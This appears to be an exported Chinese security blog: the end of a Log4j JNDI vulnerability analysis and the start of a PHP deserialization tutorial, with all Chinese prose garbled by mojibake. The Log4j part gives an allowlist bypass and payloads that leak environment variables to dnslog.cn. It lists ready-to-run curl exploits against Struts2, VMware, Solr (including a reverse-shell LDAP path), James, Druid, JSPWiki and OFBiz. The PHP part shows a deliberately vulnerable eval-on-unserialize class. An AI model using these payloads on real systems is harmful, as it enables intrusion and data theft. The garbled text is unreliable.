synchronized &lt;T&gt; T lookup(final String name) throws NamingException { try { URI uri = new URI(name); if (uri.getScheme() != null) { if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) { LOGGER.warn(\"Log4j JNDI does not allow protocol {}\", uri.getScheme()); return null; } if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) { if (!allowedHosts.contains(uri.getHost())) { LOGGER.warn(\"Attempt to access ldap server not in allowed list\"); return null; } Attributes attributes = this.context.getAttributes(name); if (attributes != null) { // In testing the \"key\" for attributes seems to be lowercase while the attribute id is // camelcase, but that may just be true for the test LDAP used here. This copies the Attributes // to a Map ignoring the \"key\" and using the Attribute's id as the key in the Map so it matches // the Java schema. Map&lt;String, Attribute&gt; attributeMap = new HashMap&lt;&gt;(); NamingEnumeration&lt;? extends Attribute&gt; enumeration = attributes.getAll(); while (enumeration.hasMore()) { Attribute attribute = enumeration.next(); attributeMap.put(attribute.getID(), attribute); } Attribute classNameAttr = attributeMap.get(CLASS_NAME); if (attributeMap.get(SERIALIZED_DATA) != null) { if (classNameAttr != null) { String className = classNameAttr.get().toString(); if (!allowedClasses.contains(className)) { LOGGER.warn(\"Deserialization of {} is not allowed\", className); return null; } } else { LOGGER.warn(\"No class name provided for {}\", name); return null; } } else if (attributeMap.get(REFERENCE_ADDRESS) != null || attributeMap.get(OBJECT_FACTORY) != null) { LOGGER.warn(\"Referenceable class is not allowed for {}\", name); return null; } } } } } catch (URISyntaxException ex) { // This is OK. } return (T) this.context.lookup(name); } ä½†è¿™ä¸ªä¿®å¤å­˜åœ¨é—®é¢˜ï¼Œå¦‚æœnew URI(name)æŠ›å‡ºäº†URISyntaxExceptionå¼‚å¸¸ï¼Œåˆ™ä¼šè·³è¿‡ç™½åå•æ ¡éªŒç›´æ¥è°ƒç”¨lookupã€‚URIåŠ ä¸ç¼–ç çš„ç©ºæ ¼å¯ä»¥è§¦å‘URISyntaxExceptionè·³å‡ºtry catchç›´æ¥æ‰§è¡Œlookupï¼Œä½†åœ¨lookupé‡Œä¼šå»æ‰ç©ºæ ¼ï¼Œæ­£å¸¸è§¦å‘JNDIæ³¨å…¥ã€‚ 1${jndi:ldap://127.0.0.1:1389/ badClassName} å…¶ä»–åˆ©ç”¨æ–¹å¼è¯»å–æ•æ„Ÿä¿¡æ¯log4jä¸­çš„ä¸¤ä¸ªå‰ç¼€syså’Œenvï¼Œæ˜¯åˆ†åˆ«é€šè¿‡System.getProperty()å’ŒSystem.getenv()å®ç°çš„ï¼Œèƒ½å¤Ÿè·å–ç¯å¢ƒå˜é‡å’Œç³»ç»Ÿå±æ€§ï¼Œå†é…åˆOut-of-Bandï¼Œå°±èƒ½è¯»å–åˆ°ç¯å¢ƒå˜é‡å’Œç³»ç»Ÿå±æ€§ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚ POC 1${jndi:ldap://${env:USER}.dnslog.cn/abc} è¯»å–é…ç½®æ–‡ä»¶bundleå‰ç¼€ResourceBundleLookupä¸­ä¼šæŠŠ key æŒ‰ç…§ :åˆ†å‰²æˆä¸¤ä»½ï¼Œç¬¬ä¸€ä¸ªæ˜¯ bundleName è·å– ResourceBundleï¼Œç¬¬äºŒä¸ªæ˜¯ bundleKey è·å– Properties Valueã€‚ bundleå‰ç¼€åœ¨åªå¼•å…¥log4jçš„é¡¹ç›®ä¸Šé»˜è®¤ä¸æ”¯æŒï¼Œæµ‹è¯•åœ¨springæ¡†æ¶é‡Œæ”¯æŒã€‚ POC 1${jndi:ldap://${bundle:bundleName:bundleKey}.ed7yce.dnslog.cn/abc} å—å½±å“ç»„ä»¶è§¦å‘æ–¹å¼struts2 æ£€æŸ¥è¯·æ±‚è·¯å¾„è§¦å‘ åœ¨struts2-coreåŒ…çš„org.apache.struts2.dispatcher.mapper#cleanupActionNameä¸­ï¼Œæ£€æŸ¥actionåçš„èŒƒå›´æ˜¯å¦åœ¨[a-zA-Z0-9._!/\\-]å†…ï¼Œè‹¥å­˜åœ¨è®¿é—®ä¹‹å¤–çš„å­—ç¬¦ï¼Œåˆ™ä¼šå°†actionåè¾“å‡ºåˆ°WARNæ—¥å¿—ä¸­ã€‚ 12345678protected String cleanupActionName(String rawActionName) { if (this.allowedActionNames.matcher(rawActionName).matches()) { return rawActionName; } else { LOG.warn(\"{} did not match allowed action names {} - default action {} will be used!\", rawActionName, this.allowedActionNames, this.defaultActionName); return this.defaultActionName; }} åœ¨è¯·æ±‚è·¯å¾„ä¸­ä¸¤ä¸ªç›¸é‚»çš„/ä¼šè¢«è½¬æ¢ä¸ºä¸€ä¸ª/ï¼Œå°†å…¶ä¸­ä¸€ä¸ª/æ›¿æ¢ä¸º${::-/}å¯é˜²æ­¢è¢«è½¬æ¢ã€‚ æœ‰çš„struts2ç‰ˆæœ¬çš„ç›¸åŒç±»ä¸­è¿˜å­˜åœ¨cleanupNamespaceNameæ–¹æ³•ï¼Œåˆ©ç”¨æ–¹å¼ç›¸åŒã€‚ POC 1http://localhost:8080/helloworld_war/$%7Bjndi:rmi:$%7B::-/%7D/127.0.0.1:8888/Calc%7D/ æ£€æŸ¥è¯·æ±‚å‚æ•°é•¿åº¦ åœ¨struts2-coreåŒ…çš„com.opensymphony.xwork2.interceptor#isWithinLengthLimitä¸­ï¼Œè®¿é—®ä¸€ä¸ªå­˜åœ¨çš„actionï¼Œä¼šæ£€æŸ¥è¯·æ±‚å‚æ•°åçš„é•¿åº¦ï¼Œè‹¥é•¿åº¦è¶…è¿‡é»˜è®¤çš„100ä¸ªå­—ç¬¦ï¼Œè¯·æ±‚å‚æ•°ååˆ™ä¼šè¾“å‡ºåˆ°debugæ—¥å¿—ä¸­ã€‚ 12345678protected boolean isWithinLengthLimit(String name) { boolean matchLength = name.length() &lt;= this.paramNameMaxLength; if (!matchLength) { LOG.debug(\"Parameter [{}] is too long, allowed length is [{}]\", name, String.valueOf(this.paramNameMaxLength)); } return matchLength;} POC 1http://localhost:8080/helloworld_war/hello.action?$%7Bjndi:rmi://127.0.0.1:8888/Calc%7Daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=123 è·å–é™æ€æ–‡ä»¶If-Modified-Sinceå¤´ struts2åœ¨org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter#doFilteræ‹¦æˆªä¸€ä¸ªè¯·æ±‚ï¼Œä¸”è¯·æ±‚çš„è·¯å¾„ä¸åœ¨æ’é™¤çš„è·¯å¾„å†…ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨executeå±æ€§çš„executeStaticResourceRequestæ–¹æ³•ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºé™æ€æ–‡ä»¶ã€‚ åœ¨org.apache.struts2.dispatcher.ExecuteOperations#executeStaticResourceRequesté‡Œï¼Œè¯·æ±‚ä»¥strutsæˆ–staticå¼€å¤´åˆ™ä¼šäº¤ç»™DefaultStaticContentLoaderçš„findStaticResourceå¤„ç†ã€‚ findStaticResourceæ–¹æ³•ä¸­ï¼Œé™æ€æ–‡ä»¶ä¼šä»struts2 coreçš„org.apache.struts.staticåŒ…ä¸‹æ‰¾ï¼Œç„¶åä¼šäº¤ç»™åŒç±»çš„processæ–¹æ³•å¤„ç†ã€‚è¯¥åŒ…å­˜åœ¨ä»¥ä¸‹é™æ€æ–‡ä»¶ã€‚ tooltip.gif domtt.css utils.js domTT.js inputtransfersselect.js optiontransferselect.js processæ–¹æ³•é‡Œï¼Œé™æ€æ–‡ä»¶è¾“å…¥æµéç©ºæ—¶ï¼Œåˆ™ä¼šå°è¯•å°†è¯·æ±‚å¤´If-Modified-Sinceçš„å€¼è½¬ä¸ºDateç±»å‹ï¼Œå½“è½¬æ¢å¤±è´¥æŠ›å‡ºå¼‚å¸¸ï¼ŒIf-Modified-Sinceçš„å€¼å°±ä¼šè¾“å‡ºåˆ°WARNæ—¥å¿—ä¸­ã€‚ æˆ‘ä»¬è®¿é—®struts2ä¸­é»˜è®¤çš„é™æ€æ–‡ä»¶ï¼Œå¹¶è®¾ç½®If-Modified-Sinceå¤´ä¸ºéDateç±»å‹å³å¯è§¦å‘log4jæ¼æ´ã€‚ POC 1curl -vv -H &quot;If-Modified-Since: \\${jndi:rmi:\\${::-/}/localhost:8888/Calc}&quot; http://192.168.217.1:8080/helloworld_war/struts/utils.js vmware1curl --insecure -vv -H &quot;X-Forwarded-For: \\${jndi:ldap://10.0.0.3:1270/lol}&quot; &quot;https://10.0.0.4/websso/SAML2/SSO/photon-machine.lan?SAMLRequest=&quot; slor12curl &apos;http://localhost:8983/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&amp;wt=json&apos;curl &apos;http://localhost:8983/solr/admin/cores?action=CREATE&amp;name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D&amp;wt=json&apos; James12echo 233 &gt; email.txtcurl --url &quot;smtp://localhost&quot; --user &quot;test:test&quot; --mail-from &apos;${jndi:ldap://localhost:1270/abc}@gmail.com&apos; --mail-rcpt &apos;test&apos; --upload-file email.txt Druid1curl -vv -X DELETE &apos;http://localhost:8888/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2flocalhost:1270%2fabc%7d&apos; JSPWiki1curl -vv http://localhost:8080/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/ OFBiz1curl --insecure -vv -H &quot;Cookie: OFBiz.Visitor=\\${jndi:ldap://localhost:1270/abc}&quot; https://localhost:8443/webtools/control/main åè®°åœ¨æˆæ–‡é‚£å¤©æ—©ä¸Šï¼Œ@su18å¸ˆå‚…åœ¨ç¾¤é‡Œå‘å¸ƒlog4jè¯¦ç»†åˆ†ææ–‡ç« ï¼Œå…¶ä¸­è¿˜æœ‰log4j 1.xçš„JNDIåˆ©ç”¨æ€è·¯ï¼Œè™½ç„¶å®ç°æ¡ä»¶æŒºè‹›åˆ»ï¼Œä½†ä¸å¾—ä¸æ„Ÿå¹å¸ˆå‚…ä»¬çœŸçš„ç»†ã€‚ è¿™ç¯‡æ–‡ç« å†™ä¸‹æ¥å°±èŠ±äº†ä¸€å¤©åŠçš„æ—¶é—´ï¼Œæ¯”ä»¥å¾€å¿«äº†ä¸å°‘ï¼Œè½¬äº†å®‰å…¨ç ”ç©¶å²—è¿˜æ˜¯æœ‰æŒºå¤šæ—¶é—´å­¦ä¸œè¥¿çš„ï¼Œè™½ç„¶ä¹Ÿæœ‰æ€•leaderå‚¬çš„ç¼˜æ•…ã€‚ğŸ˜‚ å‚è€ƒhttps://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg https://lorexxar.cn/2021/12/10/log4j2-jndi/#2-15-0-rc1-%E7%9A%84%E4%BF%AE%E5%A4%8D https://xz.aliyun.com/t/10649#toc-2 https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis","link":"/2021/12/16/log4jæ¼æ´åˆ†æ/"},{"title":"phpååºåˆ—åŒ–æµ…æ","text":"å‰è¨€è¿›é˜¶çš„ä»£ç å®¡è®¡ï¼Œååºåˆ—åŒ–æ˜¯ç»•ä¸è¿‡çš„åå•Šã€‚ä¸»æµçš„å‡ ä¸ªWebå¼€å‘è¯­è¨€ï¼Œåƒphpã€C#ã€Javaéƒ½æœ‰ååºåˆ—åŒ–ï¼Œå…¶ä¸­å°±å±phpçš„ååºåˆ—åŒ–ç®€å•æ˜“æ‡‚ï¼Œååºåˆ—åŒ–çš„å­¦ä¹ ä¹‹è·¯å°±ä»è¿™é‡Œå¼€å§‹ã€‚ ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–å¦‚æœæƒ³è¦æŒä¹…åŒ–ä¿å­˜ä¸€ä¸ªå¯¹è±¡ï¼Œé™¤äº†å°†å¯¹è±¡çš„å†…å®¹ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œè¿˜èƒ½å°†å¯¹è±¡åºåˆ—åŒ–ï¼Œä½¿å…¶è½¬æ¢ä¸ºä¸€ä¸²æ•°æ®ã€‚åºåˆ—åŒ–ä½¿å¾—å¯¹è±¡çš„ä¿å­˜å’Œä¼ è¾“å˜å¾—æ›´ä¸ºç®€ä¾¿ï¼Œå…¶ä¸­åºåˆ—åŒ–çš„å¯¹è±¡å¯ä»¥æ˜¯ç±»å¯¹è±¡ã€å˜é‡ã€æ•°ç»„ç­‰ã€‚å¯¹è±¡çš„è¿˜åŸåˆ™é€šè¿‡ååºåˆ—åŒ–å®ç°ã€‚ PHPååºåˆ—åŒ–æ ¼å¼åºåˆ—åŒ–çš„å¯¹è±¡æœ‰ä¸åŒçš„ç±»å‹ï¼Œä¸ºäº†åŒºåˆ†ä¸åŒçš„ç±»å‹ï¼Œåºåˆ—åŒ–çš„å­—ç¬¦ä¸²è‡ªç„¶æœ‰ä¸åŒçš„æ ¼å¼ã€‚phpå¸¸è§çš„ç±»å‹åºåˆ—åŒ–åçš„å†…å®¹å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223&lt;?php$str = \"str\";$int = 1;$float = 1.1;$obj = new DateTime();$arr = array(1);$bool = true;$null = null;echo serialize($str);echo \"&lt;br&gt;\";echo serialize($int);echo \"&lt;br&gt;\";echo serialize($float);echo \"&lt;br&gt;\";echo serialize($obj);echo \"&lt;br&gt;\";echo serialize($arr);echo \"&lt;br&gt;\";echo serialize($bool);echo \"&lt;br&gt;\";echo serialize($null) å¼€å¤´çš„ä¸€ä¸ªå­—ç¬¦ä»£è¡¨ç±»å‹ï¼Œåé¢è·Ÿç€ä¸€ä¸ªå†’å·:ç”¨äºåˆ†éš”ç±»å‹å’Œå€¼ï¼›å¯¹äºå­—ç¬¦ä¸²ç±»å‹ã€å˜é‡åå’Œç±»åï¼Œä»£è¡¨ç±»å‹çš„å­—ç¬¦åè¿˜è·Ÿç€ä¸€ä¸ªæ•°å­—ï¼Œç”¨äºæè¿°åé¢å­—ç¬¦ä¸²çš„é•¿åº¦ï¼›ç›¸åŒçš„ï¼Œç±»å¯¹è±¡å’Œæ•°ç»„ä¹Ÿå­˜åœ¨ä¸€ä¸ªæ•°å­—ç”¨äºæè¿°ç±»å¯¹è±¡å±æ€§æ•°é‡æˆ–æ•°ç»„é•¿åº¦ï¼Œå…¶ä¸­å±æ€§æˆ–æ•°ç»„å†…å®¹ç”¨ä¸€å¯¹èŠ±æ‹¬å·æ‹¬èµ·æ¥ï¼ŒèŠ±æ‹¬å·é‡Œå¯ä»¥åµŒå¥—å…¶ä»–ç±»å‹çš„åºåˆ—åŒ–å†…å®¹ ã€‚ é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸¤ä¸ªä¸å¸¸è§ï¼Œä½†å€¼å¾—å…³æ³¨çš„ç±»å‹æè¿°ç¬¦ï¼šå¤§å†™Så’Œå¤§å†™Rï¼Œå¤§å†™Så¯ä»¥ä¼ å…¥hexç¼–ç çš„å­—ç¬¦ï¼Œå¤§å†™Rå¯ä»¥ä»å·¦åˆ°å³ä¸ç¬¬nä¸ªååºåˆ—åŒ–çš„å˜é‡è¿›è¡Œç»‘å®šã€‚ 123456789101112&lt;?php$hex = 'S:3:\"\\31\\32\\33\";';$res = 'a:2:{s:3:\"abc\";s:3:\"abc\";s:3:\"res\";R:2;}';echo unserialize($hex);echo \"&lt;br&gt;\";$arr = unserialize($res);echo var_dump($arr);echo \"&lt;br&gt;\";$arr[\"abc\"] = \"def\";echo var_dump($arr) å¯¹äºphpçš„ç±»ï¼Œå…¶å±æ€§çš„è®¿é—®ä¿®é¥°ç¬¦æœ‰ä¸‰ç§ï¼špublicã€protectedå’Œprivateï¼Œåºåˆ—åŒ–åŒºåˆ†è®¿é—®ä¿®é¥°ç¬¦æ˜¯é€šè¿‡å±æ€§çš„æ ‡è®°å®ç°çš„ã€‚åºåˆ—åŒ–æ—¶å¯èƒ½ä¼šçœ‹åˆ°å±æ€§åçš„é•¿åº¦å’Œæè¿°çš„é•¿åº¦ä¸ä¸€è‡´ï¼Œæ˜¯å› ä¸ºprotectedå’Œprivateä¿®é¥°çš„å˜é‡ååœ¨ç»è¿‡åºåˆ—åŒ–ååŒ…å«äº†ä¸å¯è§çš„00å­—ç¬¦ã€‚ ä¸‹åˆ—ä»£ç å°†åºåˆ—åŒ–åçš„00å­—ç¬¦æ›¿æ¢ä¸ºurlç¼–ç ï¼Œå°±å¯ä»¥å¾ˆç›´è§‚çš„çœ‹åˆ°å®ƒçš„ä½ç½®ã€‚protectedä¿®é¥°ç¬¦çš„æ ¼å¼ä¸ºï¼š%00*%00å±æ€§åï¼Œprivateä¿®é¥°ç¬¦çš„æ ¼å¼ä¸ºï¼š%00ç±»å%00å±æ€§åï¼Œpublicä¿®é¥°ç¬¦åˆ™ç›´æ¥ä¸ºå±æ€§åã€‚ 12345678910&lt;?phpclass Test{ public $public; protected $protected; private $private;}echo str_replace(\"\\x00\",\"%00\",serialize(new Test())); PHPé­”æœ¯å‡½æ•°ååºåˆ—åŒ–ä¸ä¼šç›´æ¥æ§åˆ¶ä»£ç çš„æ‰§è¡Œæµç¨‹ï¼Œä½†é€šè¿‡ç‰¹å®šæ¡ä»¶ä¸‹ä¼šè¢«è‡ªåŠ¨è°ƒç”¨çš„é­”æœ¯æ–¹æ³•æ„æˆPOPé“¾ï¼Œå¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶è¯»å†™ç­‰åŠŸèƒ½ã€‚PHPä¸­æ‰€æœ‰çš„é­”æœ¯æ–¹æ³•å’Œä½œç”¨å¦‚ä¸‹ï¼š æ–¹æ³•å ä½œç”¨ __construct æ„é€ å‡½æ•°ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ __destruct ææ„å‡½æ•°ï¼Œå’Œæ„é€ å‡½æ•°ç›¸åï¼Œåœ¨å¯¹è±¡ä¸å†è¢«ä½¿ç”¨æ—¶(å°†æ‰€æœ‰è¯¥å¯¹è±¡çš„å¼•ç”¨è®¾ä¸ºnull)æˆ–è€…ç¨‹åºé€€å‡ºæ—¶è‡ªåŠ¨è°ƒç”¨ __toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ï¼ŒæŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ï¼Œè¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚echoæ‰“å°å‡ºå¯¹è±¡å°±ä¼šè°ƒç”¨æ­¤æ–¹æ³• __wakeup ä½¿ç”¨unserializeæ—¶è§¦å‘ï¼Œååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰è°ƒç”¨è¯¥æ–¹æ³• __sleep ä½¿ç”¨serializeæ—¶è§¦å‘ ï¼Œåœ¨å¯¹è±¡è¢«åºåˆ—åŒ–å‰è‡ªåŠ¨è°ƒç”¨ï¼Œè¯¥å‡½æ•°éœ€è¦è¿”å›ä»¥ç±»æˆå‘˜å˜é‡åä½œä¸ºå…ƒç´ çš„æ•°ç»„(è¯¥æ•°ç»„é‡Œçš„å…ƒç´ ä¼šå½±å“ç±»æˆå‘˜å˜é‡æ˜¯å¦è¢«åºåˆ—åŒ–ã€‚åªæœ‰å‡ºç°åœ¨è¯¥æ•°ç»„å…ƒç´ é‡Œçš„ç±»æˆå‘˜å˜é‡æ‰ä¼šè¢«åºåˆ—åŒ–) __call åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ï¼Œå³å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³• __callStatic åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get è¯»å–ä¸å¯è®¿é—®çš„å±æ€§çš„å€¼æ—¶ä¼šè¢«è°ƒç”¨ï¼ˆä¸å¯è®¿é—®åŒ…æ‹¬ç§æœ‰å±æ€§ï¼Œæˆ–è€…æ²¡æœ‰åˆå§‹åŒ–çš„å±æ€§ï¼‰ __set åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œå³åœ¨è°ƒç”¨ç§æœ‰å±æ€§çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ __isset å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è§¦å‘ __unset å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è§¦å‘ __invoke å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ __serialize serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __serialize()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•å°†åœ¨ä»»ä½•åºåˆ—åŒ–ä¹‹å‰ä¼˜å…ˆæ‰§è¡Œã€‚å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __serialize() å’Œ __sleep() ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ __serialize() æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ __unserialize unserialize()å‡½æ•°æ£€æŸ¥æ˜¯å¦å­˜åœ¨é­”æœ¯æ–¹æ³•__unserialize()ã€‚å¦‚æœå­˜åœ¨ï¼Œæ­¤å‡½æ•°å°†æ¥æ”¶ä»__serialize()è¿”å›çš„æ•°ç»„ï¼Œç„¶åæ ¹æ®éœ€è¦ä»è¯¥æ•°ç»„ä¸­æ¢å¤å¯¹è±¡çš„å±æ€§ã€‚ __set_status èµ·å½“è°ƒç”¨ var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ __clone ä½¿ç”¨cloneå…³é”®å­—æ¥è¿›è¡Œå¯¹è±¡å¤åˆ¶æ—¶__cloneæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ __debugInfo ä½¿ç”¨var_dump()å‡½æ•°è¾“å‡ºä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶__debuginfoæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ é­”æœ¯æ–¹æ³•è§¦å‘çš„æ–¹æ³•å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151&lt;?phpclass Test{ public $public; protected $protected; private $private; function __construct() { echo \"construct\"; echo \"&lt;br&gt;\"; } function __toString() { echo \"toString\"; echo \"&lt;br&gt;\"; return \"\"; } function __call($name,$args) { echo \"call\"; echo \"&lt;br&gt;\"; } static function __callStatic($name,$args) { echo \"callStatic\"; echo \"&lt;br&gt;\"; } function __get($name) { echo \"get\"; echo \"&lt;br&gt;\"; } function __set($name,$value) { echo \"set\"; echo \"&lt;br&gt;\"; } function __isset($name) { echo \"isset\"; echo \"&lt;br&gt;\"; } function __unset($name) { echo \"unset\"; echo \"&lt;br&gt;\"; } function __invoke() { echo \"invoke\"; echo \"&lt;br&gt;\"; } static function __set_status($arr) { echo \"set_status\"; echo \"&lt;br&gt;\"; } function __clone() { echo \"clone\"; echo \"&lt;br&gt;\"; } function __debugInfo() { echo \"debugInfo\"; echo \"&lt;br&gt;\"; return null; } public function __serialize(): array { echo \"serialize\"; echo \"&lt;br&gt;\"; return [ 'public' =&gt; $this-&gt;public, 'protected' =&gt; $this-&gt;protected, 'private' =&gt; $this-&gt;private, ]; } function __unserialize(array $data): void { echo \"unserialize\"; echo \"&lt;br&gt;\"; } function __sleep() { echo \"sleep\"; echo \"&lt;br&gt;\"; return array('public', 'protected', 'private'); } function __wakeup() { echo \"wakeup\"; echo \"&lt;br&gt;\"; } function __destruct() { echo \"destruct\"; echo \"&lt;br&gt;\"; }}// construct$test = new Test();// toStringecho $test;// call$test-&gt;fun();// callStaticTest::fun();// getecho $test-&gt;private;// set$test-&gt;private = \"private\";// issetisset($test-&gt;private);// unsetunset($test-&gt;private);// invoke$test();// set_statuseval(var_export($test,true).\";\");// clone$test1 = clone $test;// debugInfovar_dump($test);echo \"&lt;br&gt;\";// serialize$ser = serialize($test);// unserialize$unser = unserialize($ser);unset($test);unset($test1); é¡ºä¾¿è¯´ä¸‹ï¼Œ__serializeå’Œ__unserializeè¿™ä¸¤ä¸ªç‰¹æ€§åœ¨php7.4ä»¥åæ‰æœ‰æ•ˆã€‚ PHPååºåˆ—åŒ–ç‰¹æ€§__wakeupç»•è¿‡__wakeupç»•è¿‡åˆ©ç”¨çš„ä¸æ˜¯phpçš„æŸä¸ªç‰¹æ€§ï¼Œè€Œæ˜¯ä¸€ä¸ªæœ‰CVEç¼–å·çš„æ¼æ´ï¼Œä¸è¿‡åœ¨æˆ‘çœ‹æ¥åªæ˜¯ä¸ªbugï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆèƒ½åˆ†åˆ°CVEç¼–å·ã€‚å—å½±å“çš„ç‰ˆæœ¬ä¸ºPHP5çš„5.6.25ä»¥ä¸‹å’ŒPHP7çš„7.0.10ä»¥ä¸‹ã€‚æ¼æ´çš„åˆ©ç”¨å¾ˆç®€å•ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­æè¿°å¯¹è±¡å±æ€§ä¸ªæ•°çš„æ•°å­—æ¯”å®é™…çš„å±æ€§ä¸ªæ•°å¤§ï¼Œåˆ™ååºåˆ—åŒ–æ—¶__wakeupæ–¹æ³•åˆ™ä¸æ‰§è¡Œã€‚ åˆ©ç”¨åœºæ™¯å˜›ï¼Œå°±æ˜¯ä»¥ä¸‹è¿™ç§__wakeupæ–¹æ³•æœ‰æ›¿æ¢æˆ–è€…è¿‡æ»¤çš„æƒ…å†µã€‚ 123456789101112131415&lt;?phpclass Weakup{ var $command; function __wakeup(){ $this-&gt;command = \"phpinfo();\"; } function __destruct(){ @eval($this-&gt;command); }}$obj = unserialize($_GET['obj']); ä»¥ä¸Špayloadä¸­ï¼Œåºåˆ—åŒ–å­—ç¬¦ä¸²æè¿°å±æ€§æœ‰ä¸¤ä¸ªï¼Œä½†å®é™…åªæœ‰ä¸€ä¸ªï¼Œç»•è¿‡äº†__wakeupï¼Œcommandå‚æ•°æ²¡æœ‰è¢«æ›¿æ¢ä¸ºphpinfoï¼Œæ‰§è¡Œäº†æˆ‘ä»¬çš„dirå‘½ä»¤ã€‚ pharååºåˆ—åŒ–ç›´æ¥çš„phpååºåˆ—åŒ–ä½¿ç”¨çš„æ˜¯unserializeè¿™ä¸ªå‡½æ•°ï¼Œä½†å¾ˆå¤šæ—¶å€™ä¸ä¸€å®šä¼šæœ‰è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå¯ä»¥åˆ©ç”¨pharå®ç°ååºåˆ—åŒ–ã€‚pharæ˜¯phpçš„å½’æ¡£æ–‡ä»¶ï¼Œpharä¸­æœ‰ä¸€å¤„å­˜å‚¨åºåˆ—åŒ–åçš„mate-dataä¿¡æ¯ï¼Œé€šè¿‡phar://ä¼ªåè®®ï¼Œé…åˆæŸäº›æ–‡ä»¶å‡½æ•°å°±å¯ä»¥è¿›è¡Œphpååºåˆ—åŒ–ã€‚ ç”ŸæˆPharå½’æ¡£æ–‡ä»¶çš„ä»£ç å¦‚ä¸‹ï¼Œä»seebugä¸ŠCVä¸‹æ¥çš„ï¼ŒsetMetadataæ–¹æ³•çš„å‚æ•°å°±æ˜¯éœ€è¦åºåˆ—åŒ–çš„å¯¹è±¡ã€‚ 1234567891011121314&lt;?php class TestObject { } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub $o = new TestObject(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; ç¬¬ä¸€æ¬¡è¿è¡Œå¯èƒ½ä¼šæŠ¥pharæ— æ³•ç”Ÿæˆçš„é—®é¢˜ï¼ŒæŒ‰ç…§æŠ¥é”™ä¿¡æ¯åœ¨é…ç½®æ–‡ä»¶ä¸­æŠŠphar.readonlyå…³é—­å³å¯ã€‚ æ‰“å¼€ç”Ÿæˆçš„pharå½’æ¡£æ–‡ä»¶ï¼Œåœ¨é‡Œé¢å¯ä»¥çœ‹åˆ°åºåˆ—åŒ–åçš„TestObjectå¯¹è±¡ã€‚ 